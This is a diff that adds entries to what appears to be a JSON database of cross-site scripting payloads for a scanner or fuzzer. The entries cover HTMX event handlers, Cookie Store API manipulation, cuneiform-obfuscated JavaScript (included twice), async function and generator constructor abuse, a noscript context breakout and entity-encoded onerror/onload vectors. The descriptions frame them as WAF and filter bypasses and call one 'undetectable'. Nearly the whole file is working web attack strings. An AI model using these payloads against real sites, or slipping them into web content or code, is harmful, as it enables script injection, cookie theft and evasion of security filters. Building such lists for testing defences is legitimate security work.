@@ -3795,5 +3795,227 @@
     "count": 0,
     "description": "Cookie bomb DoS attack - creates 500 large cookies to overwhelm browser/server",
     "level": "high"
+  },
+  {
+    "Payload": "<img src=x hx-on:htmx:load='alert(0)' />",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "'",
+      "(",
+      ")",
+      "/",
+      ":",
+      "-",
+      "0"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTMX framework exploitation - uses hx-on:htmx:load event for automatic execution",
+    "level": "critical"
+  },
+  {
+    "Payload": "<input id=input name=cookieName value=cookieValue><script>cookieStore.set(input);</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      ";",
+      "(",
+      ")",
+      ".",
+      " "
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Modern Cookie Store API exploitation - uses new browser API for cookie manipulation",
+    "level": "high"
+  },
+  {
+    "Payload": "𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\"(𒀀)\")();",
+    "Attribute": [
+      "=",
+      "'",
+      "!",
+      "+",
+      "{",
+      "}",
+      "[",
+      "]",
+      "(",
+      ")",
+      ".",
+      "\"",
+      ";",
+      "𒀀",
+      "𒉺",
+      "𒀃",
+      "𒇺",
+      "𒌐"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Cuneiform Unicode obfuscation - uses ancient script characters to hide JavaScript execution",
+    "level": "critical"
+  },
+  {
+    "Payload": "alert?.(document?.cookie)",
+    "Attribute": [
+      "?",
+      ".",
+      "(",
+      ")"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Optional chaining operator exploitation - modern JavaScript syntax for conditional execution",
+    "level": "medium"
+  },
+  {
+    "Payload": "(async function(){}).constructor('alert(1)')();",
+    "Attribute": [
+      "(",
+      ")",
+      "{",
+      "}",
+      ".",
+      "'",
+      "1",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Async function constructor abuse - bypasses Function() detection using async function",
+    "level": "high"
+  },
+  {
+    "Payload": "(async function*(){}).constructor('alert(2)')().next();",
+    "Attribute": [
+      "(",
+      ")",
+      "{",
+      "}",
+      "*",
+      ".",
+      "'",
+      "2",
+      ";",
+      "["
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Async generator constructor abuse - uses generator function constructor with next() execution",
+    "level": "high"
+  },
+  {
+    "Payload": "void''??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)",
+    "Attribute": [
+      "?",
+      ".",
+      "(",
+      ")",
+      "[",
+      "]",
+      "_",
+      "0",
+      "1",
+      "b",
+      ",",
+      " "
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Binary literal with nullish coalescing - combines binary numbers, void, and optional chaining",
+    "level": "high"
+  },
+  {
+    "Payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Noscript context escape - breaks out of noscript tag using title attribute",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg onload=prompt%26%23x000000028;document.domain)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "%",
+      "2",
+      "6",
+      "3",
+      "#",
+      "x",
+      "0",
+      "8",
+      ";",
+      "(",
+      ")",
+      "."
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Extended zero-padded HTML entities - uses maximum zero padding for entity obfuscation",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "2",
+      "0",
+      "=",
+      "&",
+      "#",
+      "x",
+      "1",
+      ";",
+      "`",
+      " "
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Hexadecimal entity reference with template literals - combines hex entities with backtick syntax",
+    "level": "critical"
+  },
+  {
+    "Payload": "𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\"(𒀀)\")();",
+    "Attribute": [
+      "=",
+      "'",
+      "!",
+      "+",
+      "{",
+      "}",
+      "[",
+      "]",
+      "(",
+      ")",
+      ".",
+      ";",
+      "𒀀",
+      "𒉺",
+      "𒀃",
+      "𒇺",
+      "𒌐"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "LEGENDARY: Cuneiform Unicode obfuscation - uses ancient Mesopotamian script for JavaScript variable names to create undetectable alert() execution",
+    "level": "legendary"
   }
 ]
